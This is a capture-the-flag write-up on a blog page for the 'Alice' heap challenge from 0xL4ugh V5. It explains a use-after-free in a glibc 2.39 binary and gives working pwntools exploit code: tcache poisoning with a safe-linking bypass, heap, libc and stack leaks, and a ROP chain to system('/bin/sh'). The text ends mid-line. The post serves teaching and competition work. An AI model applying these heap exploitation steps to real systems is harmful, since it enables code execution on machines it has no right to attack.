@@ -1,0 +1,696 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="stortny">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Tcache poisoning to RCE - UAF - gLibc 2.39I had the opportunity to co-author this challenge with @0xStrawHat for the 0xL4ughV5 CTF.We had the idea to make this challenge 24h after the ctf started so w">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Alice - 0xL4ugh_V5 CTF PWN writeup">
+<meta property="og:url" content="https://stortny.github.io/2026/01/30/Alice-0xL4ugh-V5-CTF-PWN-writeup-1/index.html">
+<meta property="og:site_name" content="STORTNY">
+<meta property="og:description" content="Tcache poisoning to RCE - UAF - gLibc 2.39I had the opportunity to co-author this challenge with @0xStrawHat for the 0xL4ughV5 CTF.We had the idea to make this challenge 24h after the ctf started so w">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://stortny.github.io/img/alice/ida_main.png">
+<meta property="og:image" content="https://stortny.github.io/img/alice/ida_create.png">
+<meta property="og:image" content="https://stortny.github.io/img/alice/ida_forget.png">
+<meta property="og:image" content="https://stortny.github.io/img/alice/fakechunks.png">
+<meta property="article:published_time" content="2026-01-30T12:29:32.000Z">
+<meta property="article:modified_time" content="2026-01-30T20:27:58.846Z">
+<meta property="article:author" content="stortny">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://stortny.github.io/img/alice/ida_main.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Alice - 0xL4ugh_V5 CTF PWN writeup - STORTNY</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"stortny.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>STORTNY&#39;S BLOG</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/rbg2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Alice - 0xL4ugh_V5 CTF PWN writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-30 13:29" pubdate>
+          January 30, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          747 words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Alice - 0xL4ugh_V5 CTF PWN writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Tcache-poisoning-to-RCE-UAF-gLibc-2-39"><a href="#Tcache-poisoning-to-RCE-UAF-gLibc-2-39" class="headerlink" title="Tcache poisoning to RCE - UAF - gLibc 2.39"></a><em><strong>Tcache poisoning to RCE - UAF - gLibc 2.39</strong></em></h2><p>I had the opportunity to co-author this challenge with @0xStrawHat for the 0xL4ughV5 CTF.<br>We had the idea to make this challenge 24h after the ctf started so we intended a straightforward simple heap exploit yet some players solved it in smarter ways so I’ll put a link to them at the bottom :)</p>
+<p><em>Challenge overview :</em><br>This challenge requires leveraging a use-after-free vuln to get  arbitrary read&#x2F;write to leak&#x2F;overwrite data and gain RCE.</p>
+<p><em>Challenge files :</em><br><a target="_blank" rel="noopener" href="https://github.com/0xStraw-Hat/pwn-challenges/blob/main/0xL4ugh%20v5/Alice/player.zip">player.zip</a></p>
+<h2 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a><strong>Static analysis</strong></h2><p>The players were given the vulnerable binary and a Docker file running a 23.04 ubuntu image using glibc version 2.39.</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-string">PIE</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure>
+<p>The binary had all security checks enabled yet this won’t stop us from exploiting it :)</p>
+<p><strong>Revserse Engineering the binary</strong></p>
+<p><img src="/img/alice/ida_main.png" srcset="/img/loading.gif" lazyload alt="main()"></p>
+<p>Now this looks pretty much like any typical heap menu challenge.</p>
+<p>By checking the create menu function we see that there are 3 main checks when allocating a memory.</p>
+<p><img src="/img/alice/ida_create.png" srcset="/img/loading.gif" lazyload alt="create()"></p>
+<ul>
+<li>There is a limit of 9 total allocation indexes.</li>
+<li>Allocated indexes can’t be re-used (the ‘why’ coming later).</li>
+<li>Maximum allocation size is 0x300.</li>
+</ul>
+<p>Those restrictions are trying to force the user to deal with tcache size chunks only.<br>It’s reading the correct size allocated so there is no heap overflow here.</p>
+<p><img src="/img/alice/ida_forget.png" srcset="/img/loading.gif" lazyload alt="forget()"></p>
+<p>For the freeing function we notice 2 things : </p>
+<ul>
+<li>There is a freeing limit of 6.</li>
+<li>Freeing a chunk does not null the pointer to that chunk so we have a Use-After-Free primitive , nor does it clear the allocations array, that’s why the check fails when trying to re-allocate at a previously used index in <code>create_memory()</code>.</li>
+</ul>
+<p><em>Tcache quick overview</em><br>tcache is a per-thread freelist (glibc ≥ 2.26) that stores recently freed small chunks (in LIFO order) to make malloc&#x2F;free faster, when a chunk is freed into tcache, its user data stores the <code>fd</code> (next free chunk) pointer. Later in glibc 2.36&gt; a hardening mechanism (Safe-Linking) was added that encodes this pointer <code>fd = next_addr ^ (heap_base &gt;&gt; 12)</code> and adds a key pointing to the thread’s tcache_perthread_struct mainly to detect double free. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//malloc.c</span><br><span class="hljs-comment">// taken from https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache_key;<br><br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>When freeing the chunk it checks its key field &amp; compares it to see if it has already been freed or not.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//malloc.c</span><br><span class="hljs-comment">// taken from https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c</span><br>	<span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))<br>	  &#123;<br>	    tcache_entry *tmp;<br>        <span class="hljs-comment">//&lt;&gt;...Snip....&lt;&gt;</span><br>		<span class="hljs-keyword">if</span> (tmp == e)<br>		  malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>	      &#125;<br>	  <br></code></pre></td></tr></table></figure>
+
+<h2 id="Exploit-strategy"><a href="#Exploit-strategy" class="headerlink" title="Exploit strategy"></a><strong>Exploit strategy</strong></h2><p>For the exploit I will be using those helper functions for clearer code.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx, size, data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;vivid is this memory?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;remember? &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;rewrite?&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;memory:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recall</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;recall?&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    <span class="hljs-keyword">return</span> p.recvline().strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;erase?&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    p.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">doublefree</span>(<span class="hljs-params">idx</span>):<br>    free(<span class="hljs-built_in">str</span>(idx).encode())<br>    edit(<span class="hljs-built_in">str</span>(idx).encode(),cyclic(<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#overwriting the key field to avoid double free detection</span><br>    free(<span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safelink</span>(<span class="hljs-params">ptr</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        ptr ^= (ptr &gt;&gt; <span class="hljs-number">12</span>) &amp; (<span class="hljs-number">0xff00000000000000</span> &gt;&gt; i*<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> ptr<br><br></code></pre></td></tr></table></figure>
+
+<p>Thanks to the UAF bug and the fact that the the fd &amp; key are stored in the user data field, after freeing a chunk, we can view the chunk to leak the heap address and edit it to alter the fd pointer &amp; make it point to a desired known memory address.</p>
+<h2 id="Leaking-Heap"><a href="#Leaking-Heap" class="headerlink" title="Leaking Heap "></a>Leaking Heap </h2><p>Here is a way to leak the heap addr.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">create(<span class="hljs-number">0</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats0&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>heap_key = recall(<span class="hljs-number">0</span>)<br>heap_base = safelink(unpack(heap_key.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>),<span class="hljs-string">&quot;all&quot;</span>))<br></code></pre></td></tr></table></figure>
+<p>However the heap leak itself isn’t sufficiant, we need more.</p>
+<p>This leads us to the think of unsorted bin, since it stores libc pointers in its metadata, making it an ideal next step for leaking the libc main_arena.</p>
+<p>Normally, in order to reach the unsorted bin with such small chunks , the tcache class count has to reach its maximum count of 7 , which is not possible due to the limit of freeing and allocation. However , since we have a heap leak +  arbitrary write primitive on known addresses , we can either alter the tcache count on the heap, or modify an allocated chunk’s size to something larger than 0x420 then free it.</p>
+<h2 id="Leaking-Libc"><a href="#Leaking-Libc" class="headerlink" title="Leaking Libc "></a>Leaking Libc </h2><p><strong>1- Altering Tcache Count</strong><br>The index of tcache counts is derived from the chunk size <code>(size &gt;&gt; 4) - 2</code> .  We can poison the tcache to return a pointer into that count address overwrite it with any value greater than 7.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py">create(<span class="hljs-number">0</span>, <span class="hljs-number">768</span>, <span class="hljs-string">b&quot;cats0&quot;</span>)<br>create(<span class="hljs-number">3</span>, <span class="hljs-number">768</span>-<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;cats3&quot;</span>)<br>create(<span class="hljs-number">4</span>,<span class="hljs-number">70</span>,<span class="hljs-string">b&quot;cats4&quot;</span>) <span class="hljs-comment">#guard chunk</span><br>doublefree(<span class="hljs-number">0</span>) <br>idx   = (<span class="hljs-number">0x310</span> &gt;&gt; <span class="hljs-number">4</span>) - <span class="hljs-number">2</span>   <span class="hljs-comment"># = 47</span><br>heap_addr = safelink(unpack(recall(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>),<span class="hljs-string">&quot;all&quot;</span>))<br>heap_key   = heap_addr &gt;&gt; <span class="hljs-number">12</span><br>heap_base  = heap_addr - <span class="hljs-number">0x2a0</span><br>count = heap_base  +<span class="hljs-number">0x10</span> + <span class="hljs-number">2</span>*idx -<span class="hljs-number">0xe</span> <span class="hljs-comment"># alignment</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Heap base  &quot;</span>,<span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Tcache count &quot;</span>,<span class="hljs-built_in">hex</span>(count))<br>edit(<span class="hljs-number">0</span>, p64(count ^ heap_base &gt;&gt; <span class="hljs-number">12</span>))<br>create(<span class="hljs-number">1</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats1&quot;</span>)<br>create(<span class="hljs-number">2</span>,<span class="hljs-number">768</span>,p64(<span class="hljs-number">0x0</span>)+p32(<span class="hljs-number">0x0</span>)+p16(<span class="hljs-number">0x0</span>)+p16(<span class="hljs-number">0x99</span>)) <span class="hljs-comment"># pad until we reach the missing 0xe offset </span><br>free(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure>
+
+<p>Then chunk 3 will be sent to unsorted bin and we can view it to get a libc leak.</p>
+<p><strong>2- Modify an Allocated Chunk Size</strong></p>
+<p>First we allocate chunk 0 which will be used for the poisoning , then we allocate 2 chunks that their size sum is larger than 0x420, in this case 0x300 * 2.<br>When allocating chunk 2 we place the fake chunk 2  size and fake chunk 1  size (prev size) to bypass the checks when freeing later.<br>And lastly we overwrite chunk1 size to smake it fit into unsorted bin.<br>Looks something like this :<br><img src="/img/alice/fakechunks.png" srcset="/img/loading.gif" lazyload alt="fake chunks"></p>
+<p>script :</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py">create(<span class="hljs-number">0</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats0&quot;</span>)<br>create(<span class="hljs-number">1</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats1&quot;</span>)<br>create(<span class="hljs-number">2</span>,<span class="hljs-number">768</span>,p64(<span class="hljs-number">0x0</span>)*(<span class="hljs-number">0x180</span>//<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x4a0</span>)+ p64(<span class="hljs-number">0x181</span>))<br><br>doublefree(<span class="hljs-number">0</span>)<br><br>heap_addr = safelink(unpack(recall(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>),<span class="hljs-string">&quot;all&quot;</span>))<br>heap_key   = heap_addr &gt;&gt; <span class="hljs-number">12</span><br>heap_base  = heap_addr - <span class="hljs-number">0x2a0</span><br>target = heap_base+ <span class="hljs-number">0x5a0</span> - <span class="hljs-number">0x10</span><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Heap base  &quot;</span>,<span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Heap Size target  &quot;</span>,<span class="hljs-built_in">hex</span>(target))<br><br>edit(<span class="hljs-number">0</span>,p64(target ^ heap_base &gt;&gt; <span class="hljs-number">12</span>))<br>create(<span class="hljs-number">3</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats3&quot;</span>)<br>create(<span class="hljs-number">4</span>,<span class="hljs-number">768</span>,p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x4a0</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment">#placing fake size</span><br><br>free(<span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure>
+<p>And that’s it we get a libc leak by viewing chunk 1</p>
+<p>From this point, the challenge can be solved in multiple ways, but im gonna go through the easy ‘intended’ way , leaking the stack address and then ROPing to system.<br>Libc keeps a global pointer <code>environ</code> to the program’s environment variables which are stored on the stack, so leaking environ directly leaks a stack address.</p>
+<p>Pretty much the same steps we’ve done earlier we allocate at env &amp; view the chunk.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">libcleak = unpack(recall(<span class="hljs-number">1</span>),<span class="hljs-string">&quot;all&quot;</span>) * <span class="hljs-number">0x100</span><br>libc.address = libcleak - <span class="hljs-number">0x203b00</span><br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>environ = libc.sym.environ - <span class="hljs-number">0x18</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Leaked libc = &quot;</span>, <span class="hljs-built_in">hex</span>(libcleak))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] environ libc = &quot;</span>, <span class="hljs-built_in">hex</span>(environ))<br><br>doublefree(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,p64(environ ^ heap_base &gt;&gt; <span class="hljs-number">12</span>))<br>create(<span class="hljs-number">5</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats5&quot;</span>)<br>create(<span class="hljs-number">6</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&#x27;\x11&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">3</span>)<span class="hljs-comment">#padding null bytes to get the full leak</span><br>stackcleak = unpack(recall(<span class="hljs-number">6</span>)[<span class="hljs-number">24</span>:],<span class="hljs-string">&quot;all&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+<p>Next we calculate the return address offset and we allocate another chunk at it so we can overwrite it with our ROP.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><br>ret = stackcleak -<span class="hljs-number">0x180</span> - <span class="hljs-number">8</span> + <span class="hljs-number">0x30</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] stack  leak&quot;</span>,<span class="hljs-built_in">hex</span>(stackcleak))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ret stack  &quot;</span>,<span class="hljs-built_in">hex</span>(ret))<br><br>doublefree(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,p64(ret ^ heap_base &gt;&gt; <span class="hljs-number">12</span>))<br>create(<span class="hljs-number">7</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats5&quot;</span>)<br>system_addr = libc.address + <span class="hljs-number">0x58750</span><br>binsh = libc.address + <span class="hljs-number">0x1cb42f</span><br>pop_rdi = libc.address + <span class="hljs-number">0x10f78b</span><br>ret = libc.address + <span class="hljs-number">0xbbcbe</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] System = &quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] /bin/sh = &quot;</span>, <span class="hljs-built_in">hex</span>(binsh))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] pop rdi ; ret = &quot;</span>, <span class="hljs-built_in">hex</span>(pop_rdi))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ret ;  &quot;</span>, <span class="hljs-built_in">hex</span>(ret))<br><br>payload = flat(<br>    pop_rdi,<br>    binsh,<br>    ret,<br>    system_addr<br>)<br><br>create(<span 